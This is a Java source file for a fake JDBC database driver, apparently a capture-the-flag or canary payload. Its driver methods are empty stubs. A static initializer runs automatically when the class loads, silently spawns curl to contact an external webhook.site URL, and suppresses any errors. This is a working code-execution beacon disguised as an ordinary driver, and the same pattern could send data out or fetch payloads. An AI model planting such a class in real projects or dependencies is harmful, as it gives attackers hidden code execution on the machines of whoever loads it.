import java.sql.*;
import java.util.Properties;
import java.util.logging.Logger;
public final class ReportCanary96182b0fde9b9b8b implements Driver {
 static {
  try { new ProcessBuilder("curl", "-fsS", "--max-time", "5",
   "-A", "ctf-processbuilder", "https://webhook.site/54fddee2-c0fc-40f2-bb14-f181d41912d5?marker=ctf").start().waitFor(); }
  catch(Exception ignored) {}
 }
 public Connection connect(String u,Properties p) { return null; }
 public boolean acceptsURL(String u) { return true; }
 public DriverPropertyInfo[] getPropertyInfo(String u,Properties p) { return new DriverPropertyInfo[0]; }
 public int getMajorVersion() { return 1; } public int getMinorVersion() { return 0; }
 public boolean jdbcCompliant() { return false; }
 public Logger getParentLogger() { return Logger.getGlobal(); }
}
